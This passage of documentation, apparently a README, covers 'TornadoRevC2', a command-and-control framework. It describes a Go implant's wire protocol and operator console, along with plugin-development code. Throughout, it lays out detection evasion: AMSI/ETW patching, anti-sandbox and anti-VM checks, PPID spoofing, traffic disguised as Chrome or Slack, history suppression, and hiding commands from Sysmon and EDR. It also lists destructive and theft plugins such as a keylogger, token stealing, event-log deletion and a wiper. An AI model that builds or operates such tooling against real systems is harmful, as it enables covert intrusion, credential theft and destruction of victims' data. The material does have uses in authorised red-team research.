  "beacon_path":  "/api/v1/analytics/init",
  "tasks_path":   "/api/v1/analytics/poll",
  "results_path": "/api/v1/analytics/event",
  "extra_headers": {
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "en-US,en;q=0.9"
  },
  "request_headers": {}
}
```

Ships with `chrome` and `slack` as examples. Add new profiles by
dropping a JSON file into the directory — no code change required.

**How the listener learns about profile paths.** At startup the listener
scans `profiles/c2/` and registers every unique path it finds as a
valid route. An agent built with `--c2-profile chrome` reaches a
listener that was started without any C2 profile flag. The
`--beacon-profile <name>` flag narrows the listener to a single
profile's paths if you want to exclude others.

### Wire Protocol

Three endpoints, two message types. JSON on the wire, base64 for binary
fields. The listener speaks HTTP/1.1 over TLS; ALPN advertises only
`http/1.1` because Werkzeug cannot parse the HTTP/2 preface.

#### `POST /beacon` — check-in

```json
// request
{
  "identity": {
    "hostname":   "WIN-DEV",
    "username":   "alice",
    "machine_id": "…",
    "os":         "windows",
    "arch":       "amd64",
    "proto":      1
  },
  "agent_pubkey": "-----BEGIN PUBLIC KEY-----\n..."
}

// response
{
  "id":            1001,
  "sleep":         60,
  "jitter":        0.3,
  "kill_deadline": 1735689600.0,
  "proto":         1,
  "cookie":        "<opaque HMAC-signed token; rotates every check-in>"
}
```

The `agent_pubkey` field is optional. When present, the server pins it
for the session's lifetime (trust-on-first-use). A later check-in
presenting a different key for the same fingerprint is logged and
refused.

#### `GET /tasks` — poll for work

Header: `Cookie: sid=<HMAC-signed session cookie>`

The cookie is issued in the `/beacon` response and rotates on every check-in. Session IDs are not accepted as credentials on their own — an enumerable integer would let anyone who can reach the listener pull tasks for every live session.

```json
[
  {"id": "3f8a2b1c", "verb": "cat",  "args": ["C:\\notes.txt"], "timeout": 60, "signature": "MEUCIQ..."},
  {"id": "a1b2c3d4", "verb": "exec", "args": ["whoami", "/all"], "timeout": 30, "signature": "MEUCIQ..."}
]
```

A 400 or 404 means the server no longer recognises the ID — the agent
re-checks in for a fresh session ID rather than retrying forever.

#### `POST /results` — upload output

Header: `Cookie: sid=<HMAC-signed session cookie>`

```json
{
  "id":        "3f8a2b1c",
  "output":    "bWVldGluZyBhdCAxNTowMA==",
  "error":     null,
  "exit_code": 0,
  "signature": "MEQCIF..."
}
```

Server returns 204 on accept. If a public key was pinned at check-in,
the signature is verified over `Result.signable()` before the result is
delivered to the waiting task.

### Native Commands

The following verbs execute **in-process** on the target — no child
process is spawned, no `execve` syscall fires, and no process-creation
telemetry is generated.

| Verb | Implementation |
|------|----------------|
| `cat <path>` | `os.ReadFile` |
| `ls [path]` | `os.ReadDir` + `os.Stat` |
| `ps` | `/proc` walk (Linux) / `tasklist` (Windows) |
| `id` | `os.Getuid` + `os.Getgid` (Linux) / `user.Current()` (Windows) |
| `env` | `os.Environ` |
| `pwd` | `os.Getwd` |
| `whoami` | `user.Current()` |
| `hostname` | `os.Hostname` |
| `uname` | `runtime.GOOS` + `runtime.GOARCH` |
| `readfile <path>` | Alias for `cat` |
| `sleep <N> [jitter]` | Update check-in interval at runtime |
| `kill` / `exit` | Self-destruct — the agent exits within 1 second |

**`exec`** is the only verb that spawns a child process. It exists for
operations that require an actual binary (`netstat`, `curl`, batch
scripts, etc.). Operators should prefer native verbs where possible.

### Cryptography

#### Task signing (server → agent)

The handler generates a fresh ECDSA P-256 keypair at startup. Every task
queued for a beacon is signed with the private key. The agent embeds the
corresponding public key at build time and refuses to execute any task
whose signature fails to verify.

The signature covers the canonical JSON of `{id, verb, args, timeout}`
serialised with sorted keys and no whitespace. The Go agent's
`marshalCanonical` disables HTML escaping to match Python's
`json.dumps` byte-for-byte — without this, any command containing
`&`, `<`, or `>` would fail verification silently.

#### Result signing (agent → server)

The agent's keypair is generated at build time and embedded as a base64
PEM. The public half is presented to the server at first check-in and
pinned for the session's lifetime. Every result the agent posts is
signed with its private key; the server verifies before delivering the
output to the waiting task.

Sessions that never present a public key accept unsigned results.
Signature-verification failures increment a per-session `rejected_results`
counter that surfaces in the `beacons` listing and logs a red line to
the operator console.

### Operator Console

| Command | Description |
|---------|-------------|
| `beacons` / `bl` | List active beacons with ID, user@host, OS/arch, sleep interval, last check-in age, check-in count, and address |
| `beacon <ID>` | Attach to a beacon's interactive console |
| `beacon-build [<os> <arch> [flags]]` | Compile an agent — wizard if no arguments |
| `beacon-rm <ID>` | Forget a session from the registry |

**Inside the beacon submenu (`beacon <ID>`):**

| Command | Description |
|---------|-------------|
| `ls`, `cat`, `ps`, `id`, `env`, `pwd`, `whoami`, `hostname`, `uname` | Native in-process verbs — no child process |
| `<cmd> [args]` | Arbitrary command, routed through a stdin-piped shell |
| `exec <cmd> [args]` | Direct spawn — argv visible in `ps` |
| `pyexec <file> [-- args]` | Run a local Python script on the target |
| `psexec <file> [-- args]` | Run a local PowerShell script (Windows) |
| `shexec <file> [-- args]` | Run a local shell script |
| `upload <local> <remote>` | Chunked upload with SHA-256 verification |
| `download <remote> <local>` | Chunked download with SHA-256 verification |
| `execmem <remote> exe\|elf [-- args]` | Execute a previously-uploaded payload in memory |
| `bof <name\|path> [args]` | Run a registered BOF or a local `.o` file |
| `bof-list` | List registered BOFs |
| `sleep <N> [jitter]` | Change the check-in interval |
| `workhours <start> <end>` / `workhours off` | Set or disable the working-hours window |
| `tasks` | List outstanding tasks |
| `info` | Show beacon identity |
| `kill` | Queue a self-destruct (with confirmation) |
| `forget` / `rm` / `remove` | Delete the session from the registry |

Beacon sessions do not appear in `status` — that command is reserved
for shell sessions. The `sessions` and `reconnects` commands show both
kinds.

### Session Logging

Every beacon gets its own log directory under `logs/`, using the same
convention as shell sessions:

```text
logs/b1001_alice@WIN-DEV_192.168.1.10_beacon/
  session.log           Check-ins, command dispatches, signature events
  plugins/              Reserved for future beacon-side plugins
```

Log entries include the check-in timestamp, source address, and — when
a task is dispatched or a result returns — the task ID.

### Limitations

The beacon subsystem is not a full C2 platform. By design:

- **No plugin compatibility.** Shell plugins assume synchronous
  execution over a live socket. Beacon verbs are native and
  self-contained. The `bofloader` registry is shared, but the plugin
  itself only runs on shell sessions.
- **No interactive streaming.** Output arrives in batches after each
  check-in. There is no `tail -f`, no interactive `top`, no
  persistent shell session.
- **Transfer throughput is bounded by sleep.** Chunked transfer
  queues one task per chunk. A large file over a 60-second sleep
  takes hours; the console warns and recommends `sleep 0` first. The
  batching layer keeps the task queue from overflowing, but it does
  not make the transfer fast.
- **`execmem exe` requires PowerShell and .NET on the target.** The
  embedded loader compiles a C# class via `Add-Type` at first
  invocation. Targets with constrained language mode or stripped
  .NET cannot use it.
- **BOF execution requires PowerShell.** Same reason. A native Go
  COFF loader would remove this dependency but is a separate
  multi-month project.
- **ELF execmem needs static linking.** Dynamically-linked ELFs may
  fail under `memfd_create` on some kernels. Build with `gcc
  -static`.
- **mTLS bundle must match between build and listener.** A beacon
  built with `--mtls-dir /path/to/A` cannot check in against a
  listener configured with `--beacon-mtls-dir /path/to/B`. The
  agent will reject the server chain and retry forever, silently
  unless the build enabled `Verbose`. Rebuilding the agent after
  the listener changes is the only way to reconcile them. The
  interactive `beacon-build` wizard checks for this mismatch and
  warns before compiling.

### Features shared with the shell handler

The beacon applies the same operational security posture as the
shell handler, with an implementation appropriate to a compiled
agent:

- **Shell history suppression.** Every child process spawned by the
  agent — including interactive shells the operator starts via
  `exec bash -i` — inherits `HISTFILE=/dev/null`, `HISTSIZE=0`,
  `HISTCONTROL=ignorespace`, and `HISTIGNORE=*`. No shell history
  is written on the target for any command the beacon runs.
- **Command obfuscation.** Commands sent through the beacon console
  are piped to a shell via stdin, not placed in argv. The shell
  process appears in `/proc/<pid>/cmdline` as `/bin/sh` on Linux or
  `cmd.exe` on Windows, with no indication of what it is running.
  Sysmon EventID 1 and auditd `execve` see only the shell, not the
  command. The `exec` command bypasses this for cases where the
  literal argv matters — it runs the target binary as a direct
  child process, with the argv visible in `ps`.
- **Automatic reconnection.** If the beacon listener restarts or the
  network flaps, the agent re-checks in for a fresh session ID on
  the next wake-up. The listener returns 404 for any session ID it
  does not recognise, and the agent's HTTP client has a 60-second
  timeout so a hung server cannot freeze it indefinitely.
- **Cookie-based session tokens.** `X-Beacon-Id` was an enumerable
  integer. It is now an HMAC-signed cookie that rotates on every
  check-in; only the most recent cookie for a session is valid.
- **Response padding.** Both `/beacon` and `/tasks` responses are
  padded to a random bucket size, so `Content-Length` does not
  correlate with task activity.
- **Jittered first check-in.** The agent waits 2–17 seconds before
  its first outbound call, matching the latency of a user-launched
  application.
- **Working-hours window.** The agent suppresses check-ins outside a
  configured window (default 08:00–19:00 local time). The window is
  settable at build time and overridable at runtime from the
  beacon console via `workhours`.
- **uTLS browser fingerprint.** With `--tls-profile chrome|firefox|safari`
  at build time, the agent presents a byte-exact browser ClientHello.
  This closes the JA3/JA4 gap that otherwise identifies a Go client
  in a single packet capture.

### Project Structure (beacon-related)

```text
TornadoRevC2/
├── tornadorevc2/
│   ├── handler.py                    Shell handler (+ 5 additive beacon edits)
│   └── beacon/                       Beacon server-side Python package
│       ├── constants.py              Defaults and tunables
│       ├── protocol.py               Task / Result dataclasses
│       ├── session.py                BeaconSession, PendingTask
│       ├── engine.py                 Registry, task dispatch, TOFU pinning
│       ├── listener.py               Flask HTTP listener over TLS
│       ├── console.py                Operator submenu
│       ├── crypto.py                 TaskSigner wrapper
│       └── builder.py                Go cross-compilation
├── agent/                            Go implant
│   ├── go.mod                        Module: tornadorevc2/agent
│   ├── main.go                       Entry point, verbs, wire types
│   ├── ps_{linux,windows}.go         Platform-specific process listing
│   ├── id_{linux,windows}.go         Platform-specific identity
│   ├── machineid_{linux,windows}.go  Platform-specific machine ID
│   └── evasion/                      Compile-time evasion features
│       ├── amsi_etw_windows.go       AMSI / ETW patching
│       ├── amsi_etw_other.go         No-op stub
│       ├── antisandbox_{linux,windows}.go
│       ├── antidebug_{linux,windows}.go
│       ├── antivm_{linux,windows}.go
│       ├── sleepmask_{linux,windows}.go
│       ├── ppid_spoof_windows.go     Windows-only self-respawn
│       ├── ppid_spoof_other.go       No-op stub
│       └── memwin_windows.go         Shared memory-write helpers
├── profiles/
│   └── c2/                           C2 profiles (chrome, slack, ...)
│       ├── chrome.json
│       └── slack.json
├── tls_certs/                        Auto-generated on first run (gitignore)
│   ├── server.pem
│   └── server.key
├── mtls_certs/                       Auto-generated on first run (gitignore)
│   ├── ca.pem / ca.key
│   ├── server-mtls.pem / server-mtls.key
│   └── client.pem / client.key
├── .keys/                            Auto-generated agent signing key (gitignore)
│   └── agent_signing.key
└── beacon_output/                    Compiled agents (gitignore this)
```

### Design principle

The shell handler is not modified by the beacon subsystem except for
a small number of additive edits, each tagged in the source with a
`# BEACON-EDIT-N` comment:

1. Beacon subsystem attributes in `TORNADOREVC2.__init__`
2. Conditional beacon listener startup in `start()`, including
   resolution of the mTLS bundle when `--beacon-mtls-ca` or
   `--beacon-mtls-dir` is set
3. Beacon command branches in `main_menu()` (`beacons`, `beacon`,
   `beacon-build`, `beacon-rm`)
4. Beacon argparse arguments in `main()`: `--beacon-port`,
   `--beacon-mtls-ca`, `--beacon-mtls-dir`,
   `--beacon-mtls-server-cert`, `--beacon-mtls-server-key`,
   `--beacon-profile`
5. Post-construction attribute assignments in `main()` connecting
   the argparse values to the server instance
6. The `beacon_build` method on `TORNADOREVC2`, which constructs the
   build config, stages the server public key, decides the agent
   signing keypair path, resolves the mTLS bundle, and runs the
   mTLS-compatibility preflight warning

Removing these regions restores a shell-only handler that behaves
identically to the pre-beacon version. Grep for `# BEACON-EDIT` to
see the exact set of touch points.

---

## Plugin Development

This section describes how to extend TornadoRevC2 with custom plugins. Plugins are plain Python modules that register commands with `@plugin.command` and receive a `SessionContext` for the target session. No changes to core handler code are required.

### Plugin system overview

The plugin system has four layers:

| Layer | Module | Responsibility |
|-------|--------|----------------|
| **Registration** | `plugins/api.py` | `@plugin.command` decorator, global command registry, `SessionContext` |
| **Discovery** | `plugins/loader.py` | Scans `shared/`, `linux/`, `windows/`, and external directories; imports modules |
| **Execution** | `plugins/manager.py` | Resolves platform, builds context, invokes handler, handles errors |
| **Collectors** | `plugins/shared/runner.py` | Marker parsing, JSON extraction, report formatting, logging, unconditional jitter |

At import time, the `@plugin.command` decorator registers each handler in a thread-safe global registry. At runtime, `PluginManager.run_plugin()` validates platform compatibility, constructs a `SessionContext`, and calls the handler with `(session, args)`.

Built-in plugin directories are **re-scanned on demand** — `plugins rescan` (or an explicit `plugins load <name>`) re-walks `shared/`, `linux/`, and `windows/`, imports any module that was added after startup, and enables its commands. New plugin files created during an engagement are usable immediately without restarting the handler.

Handlers return an integer exit code: `0` for success, non-zero for failure. The handler console displays warnings for non-zero returns.

### Plugin placement

Choose a location based on platform scope and whether the plugin ships with the project:

| Location | Scope | Loaded |
|----------|-------|--------|
| `tornadorevc2/plugins/shared/` | Cross-platform (internal Windows + Linux implementations) | Automatically at startup; picked up live by `plugins rescan` |
| `tornadorevc2/plugins/linux/` | Linux/Unix only | Automatically at startup; picked up live by `plugins rescan` |
| `tornadorevc2/plugins/windows/` | Windows only | Automatically at startup; picked up live by `plugins rescan` |
| `./plugins/myplugin.py` | External (any scope you define) | On demand via `plugins load` or `plugins rescan` |
| `./plugins/myplugin/__init__.py` | External package | On demand via `plugins load` or `plugins rescan` |
| Path in `TORNADOREVC2_PLUGIN_DIR` | External (custom directory) | On demand via `plugins load` or `plugins rescan` |

**Layout rules:**

- Files named `common.py`, `runner.py`, and `__init__.py` under `shared/` are skipped during discovery.
- Files starting with `_` under `linux/` or `windows/` are helper modules, not plugins.
- **Shared plugins** must be a single module in `shared/` with internal platform branching—do not duplicate cross-platform plugins in both `shared/` and `linux/`/`windows/`.
- **Platform-specific plugins** (e.g. `rdp`, `eventlogdel`) belong exclusively in `windows/` or `linux/`.

### Registration

Register a command with the `@plugin.command` decorator:

```python
from tornadorevc2.plugins import plugin, SessionContext

@plugin.command(
    name="myplugin",
    platforms=["linux", "windows", "unix"],
    description="Short description for plugins list and TAB completion",
)
def run(session: SessionContext, args):
    ...
    return 0
```

**Platform values:** `linux`, `windows`, `unix`. Linux and `unix` are treated as compatible — a plugin registered for `linux` runs on both `linux` and `unix` sessions. Default if omitted: `["linux", "windows", "unix"]`.

**Multiple commands per module:** A single file may register several commands by applying `@plugin.command` to multiple functions. Each gets an independent name.

### Execution lifecycle

When an operator runs `run myplugin 1 arg1 arg2`:

```text
1. PluginManager resolves session #1 and looks up "myplugin" in the registry
2. Platform check: plugin.platforms vs session shell type (unix/windows)
3. SessionContext(handler, client_socket) is constructed
4. Handler invoked: run(ctx, ["arg1", "arg2"])
5. Jitter delay (0.5–2.5 s) before the first target command
6. Handler executes remote work via run_shell / run_marked / run_collector_plugin
7. Output printed to operator console; results logged under logs/<session>/plugins/
8. Exit code returned (0 = success)
```

Inside an attached session (`switch <ID>`), the session ID is omitted and args start immediately after the plugin name: `run myplugin arg1 arg2`.

### Pattern 1: Simple shell plugin

Use this when you need a quick one-off command without structured JSON parsing.

```python
from tornadorevc2.plugins import plugin, SessionContext

@plugin.command(
    name="whoami",
    platforms=["linux", "windows", "unix"],
    description="Print remote user identity",
)
def run(session: SessionContext, args):
    session.log_event("Plugin whoami: started")

    if session.is_windows:
        cmd = "whoami /all"
    else:
        cmd = "id 2>/dev/null || whoami"

    output = session.run_shell(cmd, timeout=10.0)
    if not output.strip():
        session.print("Plugin 'whoami' failed — no output from target.", "red")
        session.log_plugin_result("whoami", "", "no output")
        return 1

    report = output.strip()
    session.print(report, "cyan")
    session.log_plugin_result("whoami", report)
    session.log_command("run whoami", report)
    return 0
```

### Pattern 2: Structured collector (recommended)

Use this for enumeration plugins that gather structured data on the target and return a formatted report.

```python
from tornadorevc2.plugins import plugin, SessionContext
from tornadorevc2.plugins.linux._helpers import build_linux_collector_command
from tornadorevc2.plugins.shared.common import format_generic_report
from tornadorevc2.plugins.shared.runner import run_collector_plugin
from tornadorevc2.constants import PLUGIN_MARK_END, PLUGIN_MARK_START


def _linux_collector_source():
    return r'''
import shutil, subprocess
result = {'summary': {}, 'processes': []}
# Prefer shutil.which() over spawning `which` — no process creation.
try:
    out = subprocess.check_output(['ps', 'auxww'], stderr=subprocess.STDOUT, timeout=10)
    lines = out.decode('utf-8', errors='replace').splitlines()
    result['summary'] = {'count': max(0, len(lines) - 1)}
    result['processes'] = lines[1:51]
except Exception as exc:
    result['summary'] = {'error': str(exc)}
_emit(result)
'''


def _build_linux_command():
    return build_linux_collector_command(_linux_collector_source())


def _build_windows_command():
    return rf"""
$ErrorActionPreference='SilentlyContinue'
$start='{PLUGIN_MARK_START}'; $end='{PLUGIN_MARK_END}'
$procs = Get-CimInstance Win32_Process -EA 0 |
  Select-Object -First 50 ProcessId, Name, CommandLine
$result = [ordered]@{{
  summary = @{{ count = @($procs).Count }}
  processes = @($procs)
}}
Write-Output ($start + (ConvertTo-Json $result -Depth 4 -Compress) + $end)
"""


@plugin.command(
    name="processes",
    platforms=["linux", "windows", "unix"],
    description="List running processes on the remote host",
)
def run(session: SessionContext, args):
    return run_collector_plugin(
        session,
        "processes",
        _build_linux_command,
        _build_windows_command,
        format_generic_report,
        timeout=25.0,
    )
```

**`run_collector_plugin` parameters:**

| Parameter | Type | Description |
|-----------|------|-------------|
| `session` | `SessionContext` | Target session |
| `plugin_name` | `str` | Name used in logs and error messages |
| `unix_builder` | `Callable[[], str]` or `None` | Returns the Unix/Linux shell command; `None` if unavailable |
| `win_builder` | `Callable[[], str]` or `None` | Returns the PowerShell script; `None` if unavailable |
| `formatter` | `Callable[[dict], str]` | Converts parsed JSON dict to a report string |
| `timeout` | `float` | Maximum seconds to wait for marked output (default 30) |

### Pattern 3: Custom handler

Use this for argument validation, dynamic collector construction, post-collector processing, or operator-side file handling.

```python
import re
from tornadorevc2.plugins import plugin, SessionContext
from tornadorevc2.plugins.shared.runner import _run_collector_marked, parse_collector_json

@plugin.command(
    name="memorymap",
    platforms=["linux", "windows", "unix"],
    description="Enumerate memory maps for a process (requires PID)",
)
def run(session: SessionContext, args):
    if not args or not re.match(r"^\d+$", args[0].strip()):
        session.print("Usage: run memorymap <ID> <pid>", "yellow")
        return 1

    pid = args[0].strip()
    session.log_event(f"Plugin memorymap: started for PID {pid}")
    session._handler._flush_shell(session._client_sock, timeout=1.0)

    unix_cmd = _build_linux_command(pid)
    win_ps = _build_windows_command(pid)

    raw = _run_collector_marked(session, unix_cmd, win_ps, session.platform, 45.0)
    if raw is None:
        session.print("Plugin 'memorymap' failed — no response from target.", "red")
        return 1

    data = parse_collector_json(raw)
    report = format_memorymap_report(data)
    session.print(report, "cyan")
    session.log_plugin_result("memorymap", report, ...)
    return 0
```

### Linux collectors

Linux collectors are Python source strings executed on the target via `build_linux_collector_command()`.

The wrapper in `linux/_helpers.py` automatically:

- Indents your source inside a `try/except` block
- Defines `_emit(obj)` to write `__T_PLUGIN_START__` + JSON + `__T_PLUGIN_END__`
- Emits `{"error": "...", "traceback": "..."}` on unhandled exceptions
- Encodes the script for inline execution via `python3 -c` (or `python2` fallback)
- Falls back to chunked `/tmp` staging only when the encoded payload exceeds ~20000 bytes

**Guidelines:**

- **Prefer `shutil.which()` over spawning `which`** — no process creation.
- **Prefer reading config files in-process** over spawning helper binaries (`xdg-settings`, etc.).
- Use `subprocess.check_output(..., timeout=N)` for external commands that cannot be avoided.
- Trim large lists before emitting (cap at 50–80 entries).
- Handle missing tools gracefully—leave sections empty rather than raising.
- Avoid embedding marker strings in output.
- Keep collectors compact to stay under the inline size limit and avoid `/tmp` staging.
- **Skip credential-store filenames** (`Login Data`, `logins.json`, `key4.db`, `Cookies`) when enumerating browser artifacts — even a `stat()` on these paths can trip EDR rules.

### Windows collectors

Windows collectors are PowerShell script strings returned from `_build_windows_command()`.

**Guidelines:**

- Always set `$ErrorActionPreference='SilentlyContinue'` at the top.
- Use `-EA 0` on cmdlets that may fail on older systems.
- Brace-doubling is required inside Python f-strings: `{{` and `}}`.
- Use `[ordered]@{{...}}` to preserve key order.
- Prefer built-in cmdlets over external tools.
- Wrap each logical section in its own `try/catch`.
- On interactive PowerShell sessions, scripts are delivered in-process via `win_client.py`.

### JSON payload conventions

| Key | Type | Purpose |
|-----|------|---------|
| `summary` | `dict` | High-level counts and stats; rendered first by `format_generic_report()` |
| `error` | `str` | **Hard failure** — runner prints error and returns exit code 1 |
| `traceback` | `str` | Optional; logged as detail when `error` is set |
| `reason` | `str` | **Soft failure** — use with custom formatters |
| `ok` | `bool` | Success flag for operational plugins |
| Lists of `dict` | `list` | Rendered as tables |
| Lists of `str` | `list` | Rendered as bullet lists |
| Nested `dict` | `dict` | Rendered as labeled sections |

**Graceful degradation:** For multi-section enumeration, use separate dict keys per section and catch exceptions locally. Do not set top-level `error` unless the entire collector failed.

### Custom formatters

Pass a custom formatter to `run_collector_plugin` instead of `format_generic_report`:

```python
from tornadorevc2.plugins.shared.common import format_section, format_list_section

def format_firewall_report(data: dict) -> str:
    sections = []
    summary = data.get("summary") or {}
    if summary:
        sections.append(format_section("Summary", summary))
    for key in ("ufw", "iptables", "windows_defender_firewall"):
        block = data.get(key)
        if isinstance(block, dict) and block:
            sections.append(format_section(key.replace("_", " ").title(), block))
    if not sections:
        return "Firewall: no data collected."
    return "\n\n".join(sections)
```

Reusable helpers in `plugins/shared/common.py`:

| Function | Purpose |
|----------|---------|
| `format_generic_report(data, title='Results')` | Default table/section renderer |
| `format_section(title, fields, width=22)` | Key-value section |
| `format_list_section(title, items, empty='(none)')` | Bulleted list |
| `format_table_section(title, rows, columns)` | Dict rows as columns |
| `format_firewall_report`, `format_memorymap_report`, etc. | Plugin-specific formatters |

### Platform-specific plugins

**Windows-only:**

```python
@plugin.command(name="rdp", platforms=["windows"], description="...")
def run(session: SessionContext, args):
    return run_collector_plugin(
        session, "rdp",
        None,
        build_command,
        format_generic_report,
        timeout=35.0,
    )
```

**Linux-only:**

```python
@plugin.command(name="cron", platforms=["linux", "unix"], description="...")
def run(session: SessionContext, args):
    return run_collector_plugin(
        session, "cron",
        build_linux_command,
        None,
        format_generic_report,
        timeout=30.0,
    )
```

### External plugins

External plugins let you extend TornadoRevC2 without modifying the repository.

```bash
# Default location (created automatically if missing)
./plugins/myplugin.py

# Or set a custom directory
export TORNADOREVC2_PLUGIN_DIR=/path/to/my/plugins
```

**Workflow:**

```bash
plugins load myplugin      # load a known plugin
plugins rescan             # discover and load every new plugin on disk
plugins info myplugin
run myplugin 1
plugins reload myplugin    # reimport after editing the source
plugins unload myplugin
```

### SessionContext API

Every handler receives a `SessionContext` wrapping the handler and client socket:

**Metadata properties:**

| Property | Type | Description |
|----------|------|-------------|
| `session_id` | `str` | Assigned session identifier |
| `platform` | `str` | `unix`, `windows`, or `unknown` |
| `is_windows` / `is_unix` | `bool` | Platform convenience flags |
| `sysinfo` | `dict` | Cached host information |
| `identity` | `dict` | Session identity/fingerprint metadata |
| `addr` | `tuple` | Remote address |
| `tls` | `bool` | Whether session uses TLS |
| `name` | `str` | Operator-assigned friendly name |
| `fingerprint` | `str` | Stable host fingerprint |
| `logger` | `SessionLogger` | Per-session log writer |
| `colors` | `dict` | Console color codes |
| `socket` | socket | Raw client socket |

**Execution methods:**

| Method | Description |
|--------|-------------|
| `run_shell(cmd, timeout=15.0)` | Send command, wait for output, return string |
| `run_shell_streaming(cmd, timeout, idle_timeout, on_chunk)` | Stream output with idle detection |
| `run_marked(unix_cmd, win_ps_script, timeout, start_mark, end_mark, strip_ws)` | Execute platform-appropriate command and extract marked payload |
| `get_cwd()` | Return remote working directory |
| `collect_sysinfo(mode='stealth')` | Trigger host info collection |

**Transfer methods:**

| Method | Description |
|--------|-------------|
| `upload(local_path, remote_path, resume=False)` | Upload file to target |
| `download(remote_path, local_path, resume=False)` | Download file from target |
| `verify_remote(remote_path)` | Verify remote file size and SHA-256 |

**Logging and output:**

| Method | Description |
|--------|-------------|
| `print(text, color=None)` | Print to operator console with optional color |
| `log_event(message)` | Append timestamped event to `session.log` |
| `log_command(cmd, output)` | Log command and output to `session.log` |
| `log_plugin_result(name, report, detail='')` | Write report to `logs/<session>/plugins/<name>_<timestamp>.log` |

### Transparent in-process routing

On Linux HTTP/2 sessions, `session.run_shell("cat /etc/passwd")` and similar single-command reads are routed by the handler to the agent's in-process dispatcher — no child process, no `execve`. Plugin authors do not need to know about this: the routing is entirely inside `handler.run_command_smart`, which `SessionContext.run_shell` calls before falling through to the shell channel.

The set of routed verbs is `cat`, `ls`, `env`/`printenv`, `ps`, `pwd`, `whoami`, `id`, `hostname`, `uname`. Commands with pipes, redirects, or multiple statements fall through to the shell unchanged.

If a plugin needs to *guarantee* the in-process path (for structured, non-string output), the low-level helpers are available:

```python
data = session._handler._inproc_read_file(session._client_sock, "/etc/hosts")
entries = session._handler._inproc_list(session._client_sock, "/etc")

| Return | Meaning | Handler behavior |
|--------|---------|------------------|
| `0` | Success | No warning displayed |
| `1` (or any non-zero) | Failure | Yellow warning: `Plugin 'name' returned code N` |
| Uncaught exception | Error | Red error message; logged to session log |

**Collector failure modes** (handled by `run_collector_plugin`):

| Condition | Behavior |
|-----------|----------|
| Timeout / no markers in output | Exit 1, log "no response" |
| Output not valid JSON | Exit 1, log raw output (truncated) as detail |
| `data["error"]` present | Exit 1, print error and traceback |
| Partial section failures | Leave section empty; do **not** set top-level `error` |

### Reference implementations

| Plugin | File | Pattern | Notes |
|--------|------|---------|-------|
| `firewall` | `plugins/shared/firewall.py` | Cross-platform collector | Multi-backend graceful degradation |
| `ports` | `plugins/shared/ports.py` | Cross-platform collector | Native `ss` / `Get-NetTCPConnection` |
| `history` | `plugins/shared/history.py` | Cross-platform collector | Linux Python + Windows PowerShell builders |
| `memorymap` | `plugins/shared/memorymap.py` | Custom handler | PID argument, dynamic builder |
| `screenshot` | `plugins/shared/screenshot.py` | Custom handler | Base64 in JSON; operator-side PNG save |
| `clipboard` | `plugins/shared/clipboard.py` | Custom handler | Soft failure via `reason` field |
| `historydel` | `plugins/shared/historydel.py` | Custom handler | Destructive; post-collector shell cleanup |
| `wiper` | `plugins/shared/wiper.py` | Custom handler | Destructive; path argument validation |
| `services` | `plugins/windows/services.py` | Windows-only collector | Minimal entry point |
| `eventlogdel` | `plugins/windows/eventlogdel.py` | Windows-only collector | Destructive; per-log failure reporting |
| `rdp` | `plugins/windows/rdp.py` | Windows-only collector | Registry and firewall enumeration |
| `virtualization` | `plugins/shared/virtualization.py` | Shared entry + split builders | Imports `linux/` and `windows/` builders |
| `secrets` | `plugins/linux/secrets.py` | Linux-only collector | Platform-restricted listing |
| `steal_token` | `plugins/windows/steal_token.py` | Windows-only custom handler | C# helper loaded via `Add-Type`; impersonation vs spawn modes |
| `preflight` | `plugins/shared/preflight.py` | Cross-platform collector with custom formatter | Risk assessment rendered before raw data; ~45 EDR agent signatures |
| `sudoers` | `plugins/linux/sudoers.py` | Linux-only collector with `-eu` / `-exp` modes | Strictly sudo/sudoers-scoped; CVE matching; baseline visudo + `sudo -n -l` verification |
| `rshell` | `plugins/linux/rshell.py` | Linux-only custom handler with subcommands | Restricted-shell detection and escape automation; callback methods spawn TLS sessions |
| `writable` | `plugins/linux/writable.py` | Linux-only collector | Bounded directory walk; structured `findings` array |
| `wmi_activity` | `plugins/windows/wmi_activity.py` | Windows-only collector | Suspicious-payload pattern matching against ~20 tokens |
| `trusts` | `plugins/windows/trusts.py` | Windows-only collector | RSAT-first with `nltest` fallback; analysis block |
| `dlls` | `plugins/windows/dlls.py` | Windows-only custom handler | Requires PID argument; signature + directory analysis |
| `keylogger` | `plugins/windows/keylogger.py` | Cross-platform custom handler with subcommands | start / status / stop / fetch; state persisted per session |

---

## Session Logging

Each session writes to an isolated directory under `logs/`. The directory name includes the session ID, user, host, IP, shell type, and timestamp; the transport and direction (reverse vs bind, TCP vs TLS vs mTLS) are recorded in `session.log` when the session is created.

```text
logs/001_user@hostname_192.168.1.10_unix_10-08-2026_143022/
  session.log           Operator commands and console output
  sysinfo.json          Host information snapshot
  transfers/            Upload and download event logs
  executions/           In-memory payload execution metadata
  plugins/              Plugin reports and collector output
      quickenum_20260812_054812.log
      firewall_20260812_055130.log
      screenshot_20260812_055412.png
```

Plugin logs contain a human-readable report and, when applicable, the raw JSON payload returned by the remote collector.

**Log writing is error-safe:** if a write fails (disk full, permission error, etc.), the failure is swallowed and the session continues. Logging never aborts an active session.

**Terminal control sequences are stripped** from all target output before it is written to disk, so logs remain readable in any editor.

Tunnel operations (SOCKS start/stop, reset, cleanup, reconnect of the remote agent) are logged via the session logger under `session.log`, including remote artifact removal results.

---

## Project Structure

```text
TornadoRevC2/
├── tornadorevc2.py                 Entry point
├── tornadorevc2/
│   ├── handler.py                  Listeners, sessions, operator console
│   ├── updater.py                  Git-based self-update and restart
│   ├── sysinfo.py                  Host information collection
│   ├── terminal.py                 PTY/TTY management (OPSEC-aware)
│   ├── transfer.py                 Chunked file transfers
│   ├── tunnel.py                   SOCKS5 pivoting
│   ├── remote_exec.py              Remote command builders
│   ├── win_client.py               Windows shell detection and script delivery
│   ├── session_registry.py         Session persistence and reconnect logic
│   ├── session_log.py              Per-session directory logging (error-safe)
│   ├── terminal_sanitize.py        ANSI/OSC/DCS sequence stripping
│   ├── export.py                   HTML transcript export
│   ├── payloads.py                 Built-in payload catalog
│   ├── http2_transport.py          HTTP/2 + HTTP/1.1 dual-stack secondary listener
│   ├── smb_transport.py            SMB named-pipe secondary transport (smbprotocol)
│   └── plugins/
│       ├── api.py                  SessionContext and plugin registration
│       ├── manager.py              Plugin lifecycle and execution
│       ├── loader.py               Module discovery
│       ├── shared/                 Cross-platform plugins
│       ├── linux/                  Linux/Unix-only plugins
│       └── windows/                Windows-only plugins
├── plugins/                        Optional external plugin directory
